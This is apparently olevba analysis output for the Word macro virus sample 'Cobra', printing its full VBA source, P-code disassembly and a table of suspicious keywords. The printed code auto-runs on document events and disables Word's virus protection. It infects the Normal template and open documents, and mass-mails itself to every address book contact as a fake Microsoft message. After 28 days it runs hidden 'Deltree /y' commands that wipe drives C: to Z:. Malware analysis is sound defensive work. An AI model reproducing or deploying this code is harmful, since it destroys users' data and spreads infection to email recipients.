olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Friday.bas 
in file: Virus.MSWord.Cobra.s - OLE stream: 'Macros/VBA/Friday'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0J.B
'An Intelligent Member of Cobra Family
Sub FileNew()
Call Protection
Call Infection
Call SeM
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call Protection
Call Infection
Call SeM
WordBasic.FileExit
End Sub
Sub FileOpen()
Call Protection
Call Infection
Call SeM
Dialogs(wdDialogFileOpen).Show
End Sub
Sub AutoClose()
Call Protection
Call Infection
Call SeM
End Sub
Sub AutoOpen()
Call Protection
Call Infection
Call SeM
End Sub
Sub Protection()
On Error Resume Next
CustomizationContext = NormalTemplate
For i = 1 To 3
CommandBars("Macro").Controls(i).OnAction = "ViewVBCode"
Next
CommandBars("View").Controls("Toolbars").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
End Sub
Sub Infection()
On Error Resume Next
Set N = NormalTemplate
Set D = ActiveDocument
NIN = False
For Each M In N.VBProject.VBComponents
If M.Name = "Friday" Then NIN = True
If M.Name <> "ThisDocument" And M.Name <> "Friday" Then Application.OrganizerDelete Source:=N.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If NIN = False Then Application.OrganizerCopy Source:=D.FullName, Destination:=N.FullName, Name:="Friday", Object:=wdOrganizerObjectProjectItems
For Each OD In Documents
For Each M In OD.VBProject.VBComponents
DIN = False
If M.Name = "Friday" Then DIN = True
If M.Name <> "Friday" And M.Name <> "Reference to Normal" And M.Name <> "ThisDocument" Then Application.OrganizerDelete Source:=OD.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If DIN = False Then
Application.OrganizerCopy Source:=N.FullName, Destination:=OD.FullName, Name:="Friday", Object:=wdOrganizerObjectProjectItems
OD.SaveAs OD.FullName, wdFormatDocument, False
End If
Next
End Sub
Sub ViewVBCode()
End Sub
Sub SeM()
On Error Resume Next
DY = "Fri"
If WeekDay(Date) = 1 Then DY = "San"
If WeekDay(Date) = 2 Then DY = "Sun"
If WeekDay(Date) = 3 Then DY = "Mon"
If WeekDay(Date) = 4 Then DY = "Tue"
If WeekDay(Date) = 5 Then DY = "Wed"
If WeekDay(Date) = 6 Then DY = "Thu"
If WeekDay(Date) = 7 Then DY = "Fri"
If Not IsDate(System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "FirstDay")) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "FirstDay") = Format(Date, "mm/dd/yy")
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "FirstDay")
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra At " + DY Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra At " + DY
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Dhaka,Bangladesh/3rd World"
Set U = CreateObject("Outlook.Application")
Set D = U.GetNameSpace("MAPI")
D.Logon "profile", "password"
For l = 1 To D.AddressLists.Count
Set AB = D.AddressLists(y)
x = 1
Set B = U.CreateItem(0)
For i = 1 To AB.AddressEntries.Count
t = AB.AddressEntries(x)
B.Recipients.Add t
x = x + 1
Next i
B.Subject = "Important Message From Microsoft Via " & Application.UserName
B.Body = "Important Document About New Software:-"
B.Add ActiveDocument.FullName
B.Send
t = ""
Next l
D.Logoff
End If
CD = Format(Date, "mm/dd/yyyy")
TD = DateValue(CD) - DateValue(ID)
If TD > 28 Then
Call DelDrive
End If
End Sub
Sub DelDrive()
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra At " + "Fri" Then
For i = 67 To 67 + 23
Shell "Deltree /y " + Chr(i) + ":\", vbHide
Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Friday - 11623 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Cobra Version 2.0J.B"
' Line #1:
' 	QuoteRem 0x0000 0x0025 "An Intelligent Member of Cobra Family"
' Line #2:
' 	FuncDefn (Sub FileNew())
' Line #3:
' 	ArgsCall (Call) Protection 0x0000 
' Line #4:
' 	ArgsCall (Call) Infection 0x0000 
' Line #5:
' 	ArgsCall (Call) SeM 0x0000 
' Line #6:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub FileExit())
' Line #9:
' 	ArgsCall (Call) Protection 0x0000 
' Line #10:
' 	ArgsCall (Call) Infection 0x0000 
' Line #11:
' 	ArgsCall (Call) SeM 0x0000 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub FileOpen())
' Line #15:
' 	ArgsCall (Call) Protection 0x0000 
' Line #16:
' 	ArgsCall (Call) Infection 0x0000 
' Line #17:
' 	ArgsCall (Call) SeM 0x0000 
' Line #18:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub AutoClose())
' Line #21:
' 	ArgsCall (Call) Protection 0x0000 
' Line #22:
' 	ArgsCall (Call) Infection 0x0000 
' Line #23:
' 	ArgsCall (Call) SeM 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub AutoOpen())
' Line #26:
' 	ArgsCall (Call) Protection 0x0000 
' Line #27:
' 	ArgsCall (Call) Infection 0x0000 
' Line #28:
' 	ArgsCall (Call) SeM 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Protection())
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #34:
' 	LitStr 0x000A "ViewVBCode"
' 	Ld i 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #39:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Sub Infection())
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set N 
' Line #44:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set D 
' Line #45:
' 	LitVarSpecial (False)
' 	St NIN 
' Line #46:
' 	StartForVariable 
' 	Ld M 
' 	EndForVariable 
' 	Ld N 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #47:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0006 "Friday"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NIN 
' 	EndIf 
' Line #48:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0006 "Friday"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld N 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld M 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	Ld NIN 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld D 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld N 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Friday"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #51:
' 	StartForVariable 
' 	Ld OD 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #52:
' 	StartForVariable 
' 	Ld M 
' 	EndForVariable 
' 	Ld OD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #53:
' 	LitVarSpecial (False)
' 	St DIN 
' Line #54:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0006 "Friday"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DIN 
' 	EndIf 
' Line #55:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0006 "Friday"
' 	Ne 
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld OD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld M 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #56:
' 	StartForVariable 
' 	Next 
' Line #57:
' 	Ld DIN 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld N 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld OD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Friday"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #59:
' 	Ld OD 
' 	MemLd FullName 
' 	Ld wdFormatDocument 
' 	LitVarSpecial (False)
' 	Ld OD 
' 	ArgsMemCall SaveAs 0x0003 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	StartForVariable 
' 	Next 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub ViewVBCode())
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub SeM())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	LitStr 0x0003 "Fri"
' 	St DY 
' Line #68:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "San"
' 	St DY 
' 	EndIf 
' Line #69:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Sun"
' 	St DY 
' 	EndIf 
' Line #70:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Mon"
' 	St DY 
' 	EndIf 
' Line #71:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Tue"
' 	St DY 
' 	EndIf 
' Line #72:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Wed"
' 	St DY 
' 	EndIf 
' Line #73:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Thu"
' 	St DY 
' 	EndIf 
' Line #74:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Fri"
' 	St DY 
' 	EndIf 
' Line #75:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0008 "FirstDay"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	ArgsLd IsDate 0x0001 
' 	Not 
' 	IfBlock 
' Line #76:
' 	Ld Date 
' 	LitStr 0x0008 "mm/dd/yy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0008 "FirstDay"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0008 "FirstDay"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #79:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Cobra At "
' 	Ld DY 
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	LitStr 0x0009 "Cobra At "
' 	Ld DY 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #81:
' 	LitStr 0x001A "Dhaka,Bangladesh/3rd World"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set U 
' Line #83:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld U 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set D 
' Line #84:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld D 
' 	ArgsMemCall Logon 0x0002 
' Line #85:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld D 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #86:
' 	SetStmt 
' 	Ld y 
' 	Ld D 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AB 
' Line #87:
' 	LitDI2 0x0001 
' 	St x 
' Line #88:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld U 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set B 
' Line #89:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AB 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #90:
' 	Ld x 
' 	Ld AB 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St t 
' Line #91:
' 	Ld t 
' 	Ld B 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #92:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #93:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #94:
' 	LitStr 0x0025 "Important Message From Microsoft Via "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld B 
' 	MemSt Subject 
' Line #95:
' 	LitStr 0x0027 "Important Document About New Software:-"
' 	Ld B 
' 	MemSt Body 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld B 
' 	ArgsMemCall Add 0x0001 
' Line #97:
' 	Ld B 
' 	ArgsMemCall Send 0x0000 
' Line #98:
' 	LitStr 0x0000 ""
' 	St t 
' Line #99:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #100:
' 	Ld D 
' 	ArgsMemCall Logoff 0x0000 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #103:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	St TD 
' Line #104:
' 	Ld TD 
' 	LitDI2 0x001C 
' 	Gt 
' 	IfBlock 
' Line #105:
' 	ArgsCall (Call) DelDrive 0x0000 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub DelDrive())
' Line #109:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Cobra At "
' 	LitStr 0x0003 "Fri"
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #110:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0043 
' 	LitDI2 0x0043 
' 	LitDI2 0x0017 
' 	Add 
' 	For 
' Line #111:
' 	LitStr 0x000B "Deltree /y "
' 	Ld i 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ":\"
' 	Add 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #112:
' 	StartForVariable 
' 	Next 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

